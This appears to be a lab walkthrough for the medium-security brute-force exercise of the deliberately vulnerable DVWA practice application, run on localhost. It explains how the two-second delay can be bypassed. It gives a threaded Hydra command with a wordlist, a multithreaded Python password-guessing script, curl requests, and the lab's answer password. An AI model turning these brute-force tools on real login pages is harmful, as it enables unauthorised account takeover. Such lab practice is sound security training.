# DVWA Brute Force — Medium Security

## URL
http://127.0.0.1:4280/vulnerabilities/brute/

## Source Code Behavior (Medium)
- Adds `sleep(2)` after each failed login attempt
- Uses `mysql_real_escape_string()` — blocks SQL injection
- Still no account lockout
- Still no CAPTCHA
- Still GET-based

## Key Differences from Low
1. 2-second delay after failed attempts (slows brute force)
2. SQL injection blocked by escaping
3. But brute force still works — just slower

## Impact of Sleep
- Without sleep: ~100+ attempts/second
- With sleep(2): ~0.5 attempts/second per thread
- Mitigation: use multiple threads/connections (sleep is per-request)

## Working Attack Methods

### Hydra (still works, just slower)
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  127.0.0.1 -s 4280 \
  http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: PHPSESSID=<session>; security=medium" \
  -t 16
```
Use `-t 16` for 16 threads to parallelize and offset the 2-second delay.

### Python with threading
```python
import requests
from concurrent.futures import ThreadPoolExecutor

url = "http://127.0.0.1:4280/vulnerabilities/brute/"
cookies = {"PHPSESSID": "<session>", "security": "medium"}
found = False

def try_password(password):
    global found
    if found:
        return
    password = password.strip()
    params = {"username": "admin", "password": password, "Login": "Login"}
    r = requests.get(url, params=params, cookies=cookies)
    if "Welcome" in r.text:
        print(f"[+] Found password: {password}")
        found = True

with open("/usr/share/wordlists/rockyou.txt", "r", errors="ignore") as f:
    passwords = [line for line in f]

with ThreadPoolExecutor(max_workers=10) as executor:
    executor.map(try_password, passwords[:1000])
```

## Step-by-Step Exploitation
1. Confirm 2-second delay on failed login (observe response time)
2. Run Hydra with multiple threads (`-t 16`)
3. Or run Python script with ThreadPoolExecutor
4. Password found: `password` (still near top of wordlists)

## curl Commands
```bash
# Single attempt (2-second delay on failure)
curl -v -w "\nTime: %{time_total}s\n" \
  "http://127.0.0.1:4280/vulnerabilities/brute/?username=admin&password=wrong&Login=Login" \
  -b "PHPSESSID=<session>;security=medium"

# Successful attempt (no delay)
curl -v "http://127.0.0.1:4280/vulnerabilities/brute/?username=admin&password=password&Login=Login" \
  -b "PHPSESSID=<session>;security=medium"
```

## Notes
- sleep(2) is server-side delay — slows but doesn't prevent brute force
- Multiple threads bypass the per-request delay
- No account lockout means unlimited attempts still possible
- The delay actually leaks timing information (fail = 2s delay, success = instant)
